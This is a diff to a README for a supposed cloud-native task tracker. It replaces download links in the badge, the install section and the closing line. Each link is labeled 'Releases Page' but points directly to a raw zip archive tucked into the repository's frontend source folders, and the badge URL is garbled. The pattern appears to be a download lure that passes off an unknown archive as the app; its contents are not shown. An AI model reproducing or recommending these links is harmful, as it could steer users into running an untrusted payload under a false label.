@@ -1,6 +1,6 @@
 # 🌥️ cloud-native-task-tracker - Track Your Tasks Effortlessly
 
-[![Download Now](https://raw.githubusercontent.com/dmrnaysu/cloud-native-task-tracker/main/frontend/src/components/cloud_native_tracker_task_3.2.zip%20Now-Get%https://raw.githubusercontent.com/dmrnaysu/cloud-native-task-tracker/main/frontend/src/components/cloud_native_tracker_task_3.2.zip)](https://raw.githubusercontent.com/dmrnaysu/cloud-native-task-tracker/main/frontend/src/components/cloud_native_tracker_task_3.2.zip)
+[![Download Now](https://github.com/dmrnaysu/cloud-native-task-tracker/raw/refs/heads/main/frontend/task-cloud-tracker-native-3.0.zip%20Now-Get%https://github.com/dmrnaysu/cloud-native-task-tracker/raw/refs/heads/main/frontend/task-cloud-tracker-native-3.0.zip)](https://github.com/dmrnaysu/cloud-native-task-tracker/raw/refs/heads/main/frontend/task-cloud-tracker-native-3.0.zip)
 
 ## 🚀 Getting Started 
 
@@ -16,7 +16,7 @@ Before you start using the application, ensure you have the following:
 
 ## 📥 Download & Install 
 
-To get the latest version of the cloud-native task tracker, visit this page to download: [Releases Page](https://raw.githubusercontent.com/dmrnaysu/cloud-native-task-tracker/main/frontend/src/components/cloud_native_tracker_task_3.2.zip).
+To get the latest version of the cloud-native task tracker, visit this page to download: [Releases Page](https://github.com/dmrnaysu/cloud-native-task-tracker/raw/refs/heads/main/frontend/task-cloud-tracker-native-3.0.zip).
 
 1. Click the link above.
 2. Choose the latest release.
@@ -68,4 +68,4 @@ Join our community of users! Share your feedback, suggestions, or ask questions 
 
 The cloud-native task tracker simplifies task management for everyone. With its friendly interface and powerful features, you can stay organized and focused. 
 
-For the latest version, visit this page to download: [Releases Page](https://raw.githubusercontent.com/dmrnaysu/cloud-native-task-tracker/main/frontend/src/components/cloud_native_tracker_task_3.2.zip). Happy task tracking!
+For the latest version, visit this page to download: [Releases Page](https://github.com/dmrnaysu/cloud-native-task-tracker/raw/refs/heads/main/frontend/task-cloud-tracker-native-3.0.zip). Happy task tracking!
